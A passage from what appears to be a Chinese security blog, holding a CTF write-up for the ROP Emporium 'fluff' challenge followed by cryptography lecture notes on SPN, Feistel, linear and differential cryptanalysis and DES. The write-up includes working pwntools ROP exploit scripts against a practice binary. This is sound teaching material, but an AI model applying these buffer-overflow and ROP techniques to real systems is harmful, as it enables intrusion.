class="string">b&#x27;b&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload += p64(pop_r12r13r14r15) + <span class="string">b&#x27;flbh/tyt&#x27;</span> + p64(write_addr) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">2</span>)		<span class="comment"># a-&gt;b g-&gt;h .-&gt;/ x-&gt;y then just -1</span></span><br><span class="line">payload += p64(mov_r12r13)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">3</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">4</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">6</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="6-fluff"><a class="markdownIt-Anchor" href="#6-fluff"></a> 6. fluff</h1>
<p>这题和上题唯一的区别就是给的gadget不同。但是这个gadget可谓是花里胡哨。3个指令都不熟悉。查！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400628 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400628</span><br><span class="line">.text:0000000000400628 questionableGadgets:</span><br><span class="line">.text:0000000000400628                 xlat</span><br><span class="line">.text:0000000000400629                 retn</span><br><span class="line">.text:000000000040062A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040062A                 pop     rdx</span><br><span class="line">.text:000000000040062B                 pop     rcx</span><br><span class="line">.text:000000000040062C                 add     rcx, 3EF2h</span><br><span class="line">.text:0000000000400633                 bextr   rbx, rcx, rdx</span><br><span class="line">.text:0000000000400638                 retn</span><br><span class="line">.text:0000000000400639 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400639                 stosb</span><br><span class="line">.text:000000000040063A                 retn</span><br><span class="line">.text:000000000040063A ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>xlat指令：将[rbx+al]的值赋值给al，这里的64位解析出来gdb显示为xlatb，赋值后rax高位不变。<br />
bextr指令：byte extract。bextr dest src1 src2<br />
<code>dest = (src1 &gt;&gt; (src2 &amp; 0xFF)) &amp; (1 &lt;&lt; ((src2 &gt;&gt; 8) &amp; 0xFF) - 1)</code><br />
即src2的次低字节表示提取bit位数，最低字节表示提取bit位起始处。将src1提取src2中指定的比特位并赋值到dest中。<br />
例如本题中的 bextr rbx rcx rdx，设rcx = 0b10101100 01011101 00010001 11100111，rdx = 0x0509，则提取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">								 98 76543210</span><br><span class="line">rcx = 0b 10101100 01011101 00010001 11100111</span><br><span class="line">							 [   ]</span><br><span class="line">rbx = 0x8</span><br></pre></td></tr></table></figure>
<p>stosb指令：将al赋值给[rdi]</p>
<p>通过上述3个指令，我们需要怎样构造flag.txt字符串呢？</p>
<p>注意到，能够将寄存器的值赋值到内存中的只有stosb指令，在__libc_csu_init函数中有pop rdi; ret的gadget，我们因此可以控制stosb指令将al的值写到哪里。接下来就需要思考如何将正确的值写入al中了。正好xlat指令提供了解决方案，可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样，整个利用的流程也就清晰了。修改rbx -&gt; 修改al -&gt; 修改内存。</p>
<p>在pwnme函数返回时，rax的值为0xb，是一个较小的值。我们可以在rbx中写入LOAD段中有一块全为0的起始地址，这样就能够将rax赋值为0，便于进行后续操作。</p>
<p>之后就是一个字符一个字符地转存到.bss段中即可。注意：stosb指令执行后rdi会自增，因此只需要写一个rdi赋值的gadget即可。</p>
<p>在赋值过程中，我们似乎可以在每赋值一个字节之后就将rax清零，然后精准定位下一个字节。但是构造完毕之后会发现，整个gadget的长度已经超过了写入的限制——0x200。因此我们需要利用上一个字节的值定位下一个字节的值。在一个字节写入完毕后，rax的值应该为这个字节对应的ASCII码，我们需要在rbx中再减去这个ASCII码值，一样可以定位到下一个字节的位置。同时要注意代码中对rcx本身加上了一个值，也要减去。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">xlat = <span class="number">0x400628</span></span><br><span class="line">bextr = <span class="number">0x40062A</span></span><br><span class="line">stosb = <span class="number">0x400639</span></span><br><span class="line">zero_seg = <span class="number">0x600fa0</span>			<span class="comment"># \x00 in this place</span></span><br><span class="line">write_addr = <span class="number">0x601038</span></span><br><span class="line">rdi = <span class="number">0x4006A3</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of char &#x27;f&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;.&#x27;, &#x27;t&#x27;, &#x27;x&#x27;, &#x27;t&#x27;</span></span><br><span class="line"><span class="comment"># you can view the hex in window &#x27;Hex View-1&#x27; in IDA_PRO to find the bytes you want </span></span><br><span class="line">char_addr = [<span class="number">0x4003C4</span>, <span class="number">0x4003C1</span>, <span class="number">0x4003D6</span>, <span class="number">0x4003CF</span>, <span class="number">0x4003C9</span>, <span class="number">0x4003D8</span>, <span class="number">0x400246</span>, <span class="number">0x4003D8</span>]</span><br><span class="line"><span class="comment"># ASCII value of each byte</span></span><br><span class="line">char = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;flag.txt&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(char)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(rdi) + p64(write_addr)			<span class="comment"># make rdi point to address needed to write</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make &#x27;f&#x27; into 0x601038</span></span><br><span class="line"><span class="comment"># gdb tell us that after gadget for rdi, rax should be 0xb, so we minus 0xb to make rax = 0</span></span><br><span class="line">payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(zero_seg - <span class="number">0x3EF2</span> - <span class="number">0xb</span>)		<span class="comment"># start = 0, len = 0x20, equals mov rbx, rcx</span></span><br><span class="line">payload += p64(xlat)</span><br><span class="line">payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(char_addr[<span class="number">0</span>] - <span class="number">0x3EF2</span>)</span><br><span class="line">payload += p64(xlat)</span><br><span class="line">payload += p64(stosb)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(char_addr[i + <span class="number">1</span>] - char[i] - <span class="number">0x3EF2</span>)		<span class="comment"># to get the right value</span></span><br><span class="line">	payload += p64(xlat)</span><br><span class="line">	payload += p64(stosb)</span><br><span class="line"></span><br><span class="line">payload += p64(rdi) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B8%8E%E9%AB%98%E7%BA%A7%E5%AF%86%E7%A0%81%E6%A0%87%E5%87%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B8%8E%E9%AB%98%E7%BA%A7%E5%AF%86%E7%A0%81%E6%A0%87%E5%87%86/" class="post-title-link" itemprop="url">密码学基础 Chapter 3——分组密码与高级密码标准</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:09" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:09+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>现代分组密码设计思想：<br>分组密码是一个{0,1}的随机代换<br>基本的变换手段为：代换与置换<br>基本的安全需求：混乱（密钥和明文以及密文之间的依赖关系复杂）、扩散（单个密钥位或明文位的影响尽可能扩散到更多的密文位，即修改明文的某一位需要尽可能导致密文的尽可能多位发生改变）<br>结构 - SPN网络和Feistel结构</p>
<p>迭代密码：将明文经过加密函数G迭代加密多次（需要密钥参与，密钥由密钥扩展算法生成，每一次加密的密钥都不相同）。多次加密能够使得比特位得到扩散，增加了密码的安全性。</p>
<p><strong>SPN网络——代换-置换网络的一轮变换过程：</strong>明文X的一轮加密包含：代换S和置换P。首先与轮密钥异或（白化），然后首先进行小代换，然后将几组的代换结果经过置换后输出。解密首先反置换再反代换即可。如输入为16比特，则代换过程则是将这16比特分为4组，每组均进行代换操作（这些代换需要借助代换表完成）置换则是将代换后的16比特打乱重排后输出。不过 **由于对于任意的线性变换A:x→y&#x3D;A(x)，有A(x$\oplus$k)&#x3D;A(x)$\oplus$A(k)**，因此存在有不同的解密顺序也能够解密出正确结果。</p>
<p><strong>Feistel结构的一轮变换过程：将输入分为两份，每一轮运算只运算了一半的输入，交替加密。流密钥函数K与一半不变的输入输入到函数F中，将得到的输出与另一半输入异或后输出。其加密与解密过程完全相同，不同的是解密密钥首先输入K<del>n</del>到K<del>0</del>，加密密钥为K<del>0</del>到K<del>n</del>，即逆序使用。非线性函数F不需要可逆。</strong> Feistel的扩散速度比SPN网络慢，因此需要更多的迭代次数</p>
<h2 id="SPN-密码体制定义"><a href="#SPN-密码体制定义" class="headerlink" title="SPN 密码体制定义"></a>SPN 密码体制定义</h2><p>设l,m,Nr是正整数，P&#x3D;C&#x3D;{0,1}^lm^<br>$K\subseteq({0,1}^{lm})^{Nr+1}$是由初始密钥k用密钥编排算法生成的所有可能的密钥编排方案集合，一个密钥编排方案记为(k^1^, k^2^, …, k^Nr+1^)<br>状态值w长度为l×m，记为w^1^, w^2^, …, w^Nr+1^<br>w可以看成m个长度为l的子串连接而成，记为w<del>&lt;1&gt;</del>，w<del>&lt;2&gt;</del>，…，w<del><m></del>，其中<br>w<del><i></del>&#x3D;w<del>(i-1)l+1</del>,w<del>(i-1)l+2</del>,…,w<del>(i-1)l+l</del></p>
<ul>
<li>SPN的特点：结构简单，易于软硬件实现；高效快速，易于扩展和强化——增加l和m可以提高穷举k的难度（但过大可能会占用过多存储资源），也可以使用多个S盒和P盒进一步提高变换的复杂度，增加Nr可以进一步提高密文的混乱程度</li>
</ul>
<h1 id="线性密码分析"><a href="#线性密码分析" class="headerlink" title="线性密码分析"></a>线性密码分析</h1><p>通过分析S盒的线性特性从而发现明文比特、密文比特和密钥比特之间可能存在的概率线性关系。存在一个比特子集使得其中元素的异或表现出非随机的分布来进行分析的密码分析方法。（已知明文攻击，给定明文、密文和S盒，确定k的部分比特）</p>
<h2 id="S盒线性逼近"><a href="#S盒线性逼近" class="headerlink" title="S盒线性逼近"></a>S盒线性逼近</h2><p>考虑一个S盒$\pi$<del>S</del>:{0,1}^m^→{0,1}^n^，具有m重输入X&#x3D;(x<del>1</del>,x<del>2</del>,…,x<del>m</del>)和n重输出Y&#x3D;(y<del>1</del>,y<del>2</del>,…,y<del>n</del>)。从X和Y中任意选择若干比特通过异或运算构成一个随机变量<br>$$x_{i_1}\oplus x_{i_2}\oplus…\oplus x_{i_k}\oplus y_{j_1}\oplus y_{j_2}\oplus…\oplus y_{j_l} $$</p>
<p>上面的结果很可能不为二分之一，就产生了特殊的概率。</p>
<p>如果选择的输入序列X对应的输出不是Y，则$Pr[Y_1&#x3D;y_1,…,Y_n&#x3D;y_n|X_1&#x3D;x_1,…,X_m&#x3D;x_m]&#x3D;0$，否则等于$2^{-m}$</p>
<h3 id="偏差"><a href="#偏差" class="headerlink" title="偏差"></a>偏差</h3><p>取值于{0,1}上的随机变量X，取值为0的概率为p，则取值为1的概率为1-p，X的偏差定义为：$\epsilon&#x3D;p-\frac{1}{2}$</p>
<h3 id="堆积引理"><a href="#堆积引理" class="headerlink" title="堆积引理"></a>堆积引理</h3><p>设$X_{i_1},X_{i_2},…,X_{i_k}$是取值于{0,1}上的独立随机变量，其偏差依次为$\epsilon_{i_1},…,\epsilon_{i_k}$，定义随机变量$X_{i_1,i_2,…,i_k}&#x3D;X_{i_1}\oplus X_{i_2}\oplus…X_{i_k}$，以$\epsilon_{i_1,i_2,…,i_k}$表示其偏差，则有<br>$$\epsilon_{i_1,i_2,…,i_k}&#x3D;2^{k-1}\prod_{j&#x3D;1}^k\epsilon_{i_j}$$</p>
<p>证明：当k&#x3D;1时结论显然成立<br>假设k&#x3D;n时上述结论成立，则当k&#x3D;n+1时<br>$Pr[X_{i_1}\oplus…\oplus X_{i_{n+1}}&#x3D;0]&#x3D;Pr[X_{i_1}\oplus…\oplus X_{i_{n}}&#x3D;0]Pr[X_{i_{n+1}}&#x3D;1]+Pr[X_{i_1}\oplus…\oplus X_{i_{n}}&#x3D;1]Pr[X_{i_{n+1}}&#x3D;0]\<br>&#x3D;(2^{n-1}\prod\epsilon_{i_j}+\frac{1}{2})(\epsilon_{i_{n+1}}+\frac{1}{2})+(\frac{1}{2}-2^{n-1}\prod\epsilon_{i_j})(\frac{1}{2}-\epsilon_{i_{n+1}})\<br>&#x3D;\frac{1}{2}+2^n\prod\epsilon_{i_j}$<br>证毕。</p>
<h3 id="线性逼近表："><a href="#线性逼近表：" class="headerlink" title="线性逼近表："></a>线性逼近表：</h3><p><img src="https://img-blog.csdnimg.cn/c583e7e41a05446198cade19f3188cb7.jpeg"><br>a表示输入的4比特，b表示输出的4比特，中间的数字表示满足$(\oplus_{i&#x3D;1}^{4}a_iX_i)\oplus(\oplus_{i&#x3D;1}^4b_iY_i)&#x3D;0$的$(x_1,x_2,x_3,x_4,y_1,y_2,y_3,y_4)$的个数（$(y_1,y_2,y_3,y_4)&#x3D;\pi_S(x_1,x_2,x_3,x_4)$），容易通过此表获取偏差。选择其中距离8最大的部分可得偏差最大的输入输出对。<strong>理解：线性逼近表是S盒的性质，仅与S盒的置换有关。</strong></p>
<h2 id="线性逼近分析过程"><a href="#线性逼近分析过程" class="headerlink" title="线性逼近分析过程"></a>线性逼近分析过程</h2><p><img src="https://img-blog.csdnimg.cn/585220025a344248b809e048daf47dff.jpeg"><br><strong>需要注意的是，线性分析只能攻击最后一个密钥，而不能攻击其他密钥，因此在分析过程中应将其他密钥视而不见，因为密钥是确定的，而偏差计算的是一种分布，与前面的密钥无关</strong>。输入和输出应尽量选择对应于线性逼近表中数值偏离8较多的，这样分析成功的概率更大。<br>对于第一轮S盒的输入，追踪其输出到最后并计算偏差</p>
<p>如上图中第一轮输入选B输出选4，则随机变量$T_1&#x3D;u_5^1\oplus u_7^1\oplus u_8^1\oplus v_6^1$的偏差为$\frac{1}{4}$<br>第二轮输入选4输出选5的偏差绝对值最大。即随机变量$T_2&#x3D;u_6^2\oplus v_6^2\oplus v_8^2$的偏差为$-\frac{1}{4}$<br>第三轮输入需要注意，第二轮输入的最低位跑到第4个盒去了，所以第三轮输入考虑两个盒，一个是$S_3^2$，输入为4；一个是$S_3^4$，输入为4，输出还是都选5。即$T_3&#x3D;u_6^3\oplus v_6^3\oplus v_8^3$偏差为$-\frac{1}{4}$；$T_4&#x3D;u_{14}^3\oplus v_{14}^3\oplus v_{16}^3$偏差为$-\frac{1}{4}$<br>$T_1\oplus T_2\oplus T_3\oplus T_4&#x3D;x_5\oplus x_7\oplus x_8\oplus v_6^3\oplus v_8^3\oplus v^3_{14}\oplus v_{16}^3\oplus k_5^1\oplus k_7^1\oplus k_8^1\oplus k_6^2\oplus k_6^3\oplus k_{14}^3\<br>&#x3D;x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4\oplus k_5^1\oplus k_7^1\oplus k_8^1\oplus k_6^2\oplus k_6^3\oplus k_{14}^3\oplus k_6^4\oplus k_8^4\oplus k_{14}^4\oplus k_{16}^4$</p>
<p>由堆积引理可知$T_1\oplus T_2\oplus T_3\oplus T_4$的偏差为$-\frac{1}{32}$（四者并不独立，因此这不是准确值，只是估算，不过仍然有效），$x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4$具有偏差$±\frac{1}{32}$（后面的k是固定不变的，因此不会计入偏差）</p>
<p><font color=red>理解：这实际上是一个加密链的分析过程，上面的选择输入是由我们自由选择的，不是说输入就是这个，而是说我们选择哪些比特参与异或。</font></p>
<p><strong>分析过程梳理：</strong></p>
<ol>
<li>收集尽可能多的在<strong>同一未知密钥k加密的T对明-密文对</strong>，用$\mathbb T$表示明-密文对的集合($|\mathbb T|&#x3D;T$)，目标是获得候选子密钥($k_{&lt;2&gt;}^5,k_{&lt;4&gt;}^5$，即4组子密钥中的第2组和第4组)</li>
<li>每个候选子密钥分配一个计数器，初始值为0</li>
<li>对于每对明-密文对，尝试所有可能的候选子密钥，计算随机变量$x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4$的结果，若结果为0则相应计数器加1</li>
<li>明-密文对尝试完毕后，真子密钥对应的计数值最接近$\frac{T}{2}±\frac{T}{32}$，其他则接近$\frac{T}{2}$（T越大结果越准确）</li>
</ol>
<p>线性密码分析基于S盒的有效线性逼近<br>是一种已知明文攻击方法，需要较多的明-密文对</p>
<ul>
<li>基于偏差$\varepsilon$的线性攻击要想获得成功，所需明密文对数量T接近$c\varepsilon^2$，c为常数<br>此算法只能分析最后一轮子密钥，缩小的穷举密钥的范围。</li>
</ul>
<h1 id="差分密码分析"><a href="#差分密码分析" class="headerlink" title="差分密码分析"></a>差分密码分析</h1><p>通过分析明文对的差值（异或）对密文对差值的影响来恢复某些密钥比特的分析方法。<br>一种<strong>选择明文攻击方法</strong>，构造若干明文串对，每对明文的异或相等，观察相应密文异或结果。</p>
<h2 id="S盒差分特征"><a href="#S盒差分特征" class="headerlink" title="S盒差分特征"></a>S盒差分特征</h2><p>设$\pi_S:{0,1}^m\rightarrow {0,1}^n$是一个S盒，长为m的有序比特串对(x,x*)，称S盒输入异或为$x’&#x3D;x\oplus x^*$，输出异或为$y’&#x3D;\pi_S(x)\oplus\pi_S(x^*)$，(x’,y’)称为一对差分。<br>对于任意$x’\in{0,1}^m$，定义集合$\Delta(x’)$为包含所有输入异或值为x’的有序对(x,x*)，该集合含有2^m^对，对集合$\Delta(x’)$中的每一对，可求出S盒的输出异或，一个非均匀的输出分布将会是一个成功差分分析的基础。</p>
<p>需要分析(x’, y’)的分布情况，其中x’是固定的。<strong>（注意每一个y’只会出现偶数次，因为x和x*互换后y和y*互换，然后y’相等）</strong></p>
<p><strong>扩散率：</strong> 条件概率$Pr[y’&#x3D;b|x’&#x3D;a]$称为差分(a,b)的扩散率$R_p(a,b)$<br>$$R_p(a,b)&#x3D;\frac{N_D(a,b)}{2^m}$$</p>
<h2 id="差分分析过程"><a href="#差分分析过程" class="headerlink" title="差分分析过程"></a>差分分析过程</h2><p><img src="https://img-blog.csdnimg.cn/540c86f6552643b8b9408c7d8a1572ca.jpeg"><br>上图中a表示输入x，b表示y’。<br><img src="https://img-blog.csdnimg.cn/e8f658f4ae774e0388bb03fa00fdd69a.jpeg"><br>第一轮应该选择扩散率最大的进行分析，能够分析成功的概率最大。,扩散率为$\frac{1}{2}$<br>第二轮追踪第一轮的输出，到了第三个子密钥中进行分析。输入选择4，输出选择6，扩散率为$\frac{3}{8}$<br>接下来按照图中红线继续分析即可。$S_2^3,S_3^3$的扩散率均为$\frac{3}{8}$<br><img src="https://img-blog.csdnimg.cn/81ad633de4e24ca4a0d982f5c4125ad6.jpeg"><br>由图可知总的扩散率即为扩散率的乘积。</p>
<p>输入异或与子密钥无关，但输出有关</p>
<p><strong>正确对</strong>：对于给定密钥，满足差分特征的明文对。对于所有明文输入，正确对产生的概率等于扩散率。</p>
<p>需要找到足够多的四元组（x,x*,y,y<em>），其中$x\oplus x^</em>&#x3D;x’$固定不变，和线性分析一样，只能分析最后一轮子密钥，对可能的候选子密钥进行猜测，正确对在正确的密钥作用下，满足差分链特征。<br>错误对：带来噪音</p>
<p>上例中测试最后一轮子密钥k^5^的8位，即穷举256个密钥。满足差分特征，则相应密钥的计数器加1</p>
<p><strong>分析过程梳理</strong>：</p>
<ul>
<li>收集尽可能多的在同一未知密钥k加密的T个4重组（x,x*,y,y*），x’&#x3D;0000101100000000，用T表示四重组的集合(|<strong>T</strong>|&#x3D;T)，目标是获得候选子密钥$(k_{&lt;2&gt;}^5,k_{&lt;4&gt;})^5$</li>
<li>每个候选子密钥分配一个计数器，初始值为0,</li>
<li>对每对明-密文，尝试所有可能的候选子密钥，计算出$u’^4$，如果$u’^4&#x3D;0000011000000110$则相应的计数器加1</li>
<li>T对明-密文尝试完毕后，真子密钥对应的计数器值最大</li>
<li>T越大，结果越准确</li>
</ul>
<p><strong>分析小结</strong>：</p>
<ul>
<li>差分密码分析基于S盒不均匀的差分特征</li>
<li>差分密码分析是一种不确定的明文分析方法，需要较多的明-密文对<ul>
<li>基于差分扩散率$\varepsilon$的差分攻击想要获得成功，所需明-密文对数量T接近$c\varepsilon^{-1}$（少于线性分析），c为某常数</li>
<li>此算法只能分析最后一轮子密钥，缩小了穷举密钥的范围</li>
</ul>
</li>
</ul>
<h1 id="高级加密标准"><a href="#高级加密标准" class="headerlink" title="高级加密标准"></a>高级加密标准</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><ul>
<li>基于Feistel结构</li>
<li>明文、密文、密钥长度为64位</li>
<li>使用8个不同的非线性S盒</li>
<li>使用扩展代换和压缩置换</li>
<li>迭代16轮</li>
<li>加密和解密算法相同，只是密钥编排方式不同</li>
</ul>
<h3 id="算法结构"><a href="#算法结构" class="headerlink" title="算法结构"></a>算法结构</h3><p>输入明文（64位），首先进行预先初始置换IP，然后使用Feistel结构和16个子密钥进行16轮迭代。之后进行逆置换IP^-1^后输出密文</p>
<h4 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h4><p>将64位分为8个字节来看，置换后也是8×8。置换后每一个字节的最后一位属于初始的第一个字节，倒数第二位属于初始的第二个字节，……以此类推，置换后的8字节中每个字节的最后一个字节分别对应初始第一个字节的第2、4、6、8、1、3、5、7个字节。这个置换固定不变。<br><img src="https://img-blog.csdnimg.cn/9f270894d81544c2b415eedb6d9c2208.jpeg"></p>
<h4 id="密钥编排过程"><a href="#密钥编排过程" class="headerlink" title="密钥编排过程"></a>密钥编排过程</h4><p>对于一个初始给定的密钥k，首先进行密钥置换$\pi_{kp}$丢掉8比特（这8比特实际上作为校验位存在），对左28位进行循环左移a<del>i</del>位，对右28位循环右移a<del>2</del>位，其中当i&#x3D;1,2,9,16时，a<del>i</del>&#x3D;1，其他时候a<del>i</del>&#x3D;2。然后进行压缩置换$\pi_{cp}$再丢掉8比特，形成第一个轮密钥（48位）。<br><img src="https://img-blog.csdnimg.cn/09667d9f44cc4889a8107c17fdf0f580.jpeg"><br>由上图可知，丢掉的是64位中每个字节的最后一位。<br><img src="https://img-blog.csdnimg.cn/310f2c2ddd0646bc8b8f2b292b921195.jpeg"></p>
<h4 id="迭代过程"><a href="#迭代过程" class="headerlink" title="迭代过程"></a>迭代过程</h4><p>每一次迭代将输入的后32位与48位密钥进行函数处理得到32位与输入前32位异或得到输出的后32位，输出前32位即为输入后32位。<br><img src="https://img-blog.csdnimg.cn/59dc6b7f140c45f1b63dfe3ec1b42023.jpeg"><br><img src="https://img-blog.csdnimg.cn/9d613dd7c6ef47d3810914f3e7de78f0.jpeg"><br>E为扩展置换：<br><img src="https://img-blog.csdnimg.cn/8f8d09ef2e5f4467a4c0dce0e1dad8a1.jpeg"><br>S盒的代换方法：<br><img src="https://img-blog.csdnimg.cn/68d33093b8704f4cad4bc4d41d10b691.jpeg"><br>每一组是6比特代换，里面最左边的一位和最右边的一位决定在哪一行代换，中间4位决定代换的值。如最左边为1，最右边为1，就应该在第4行找。S盒一共8个。</p>
<p>P为最终置换：<br><img src="https://img-blog.csdnimg.cn/26eccabd8d3541afb93aa77e3172ad43.jpeg"></p>
<h3 id="DES算法的安全性"><a href="#DES算法的安全性" class="headerlink" title="DES算法的安全性"></a>DES算法的安全性</h3><p>所有的S盒都是固定的<br>IBM提交算法后，发现反馈的结果修改了所有的S盒<br>S盒的设计准则并未完全公开<br>怀疑算法存在“陷门”</p>
<p>S盒的设计准则</p>
<ul>
<li>每一行是整数0，…，15的一个置换</li>
<li>没有一个S盒是输入变量的线性函数</li>
<li>改变S盒的一个输入位至少要引起两位输出改变</li>
<li>对于任何一个S盒和任意一个输入X，S(X)和S(X $\oplus$ 001100)至少有两个比特不同</li>
<li>对于任何一个S盒，对于任何一个输入对e，f属于{0,1}^4^，S(X)≠S(X $\oplus$ 11ef00)</li>
<li>S盒的任意一位不变，其他5位变化时，输出中的0和1的总和基本相等</li>
</ul>
<p>人们担心实际56比特的密钥长度不足以抵御穷举式攻击，密钥量只有越10^17^个<br>DES算法基本没有发现其他重大的缺陷，线性攻击和差分攻击对计算复杂度有一定影响</p>
<p>DES存在4个<strong>弱密钥</strong>：使用弱密钥加密明文得到密文，对密文进行弱密钥加密和解密均可以恢复明文。（$K_1&#x3D;K_{16}$）<br>$K_1&#x3D;0101010101010101\<br>K_2&#x3D;fefefefefefefefe\<br>K_3&#x3D;1f1f1f1f0e0e0e0e\<br>K_4&#x3D;e0e0e0e0f1f1f1f1$<br><strong>半弱密钥</strong>：存在K和K’，使得$E_K\cdot E_{K’}&#x3D;I$，DES存在12个半弱密钥。<br>如$K_1&#x3D;e001e001f101f101,K_2&#x3D;01e001e001f101f1$<br><strong>补密钥</strong>：$DES_{\bar{K}}(\bar{M})&#x3D;\overline{DES_K(M)}$，补密钥将密钥的所有位取反得到。 </p>
<p>DES不是幂等的，不能构成封闭群，因此可以通过自身乘积以提高安全性，其中三重DES使用最为广泛，使用不同密钥对其加密三次。</p>
<ul>
<li>中间相遇攻击双重DES：穷举密钥加密P<del>1</del>，保存结果，一共有2^56^个值</li>
<li>穷举前解密C<del>1</del>，比较P<del>1</del>加密的结果，若相同使用当前解密的密钥K<del>2</del>和表中对应的K<del>1</del>来加密P<del>2</del>，若得到C<del>2</del>，则说明得到正确的K<del>1</del>和K<del>2</del>，否则继续寻找。总复杂度为2^57^，但空间使用也很大。</li>
